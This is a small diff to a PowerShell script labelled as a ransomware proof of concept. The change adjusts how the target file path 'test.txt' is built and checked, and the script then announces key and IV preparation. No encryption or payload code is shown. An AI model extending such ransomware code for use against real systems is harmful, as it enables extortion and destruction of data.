@@ -1,9 +1,9 @@
 # BTBit Powershell Ransomware PoC 
 # file to encrypt
-$drive = (get-location).Drive.Name
-#$file = $drive + ":\test.txt"
 $file = "test.txt"
-if (-not(Test-Path -Path $file -PathType Leaf)) { exit }
+$drive = (get-location).Drive.Name
+$file_exist = $drive + ":\" + $file
+if (-not(Test-Path -Path $file_exist -PathType Leaf)) { exit }
 #
 echo "Prepare encryption key and IV"
 sleep 10
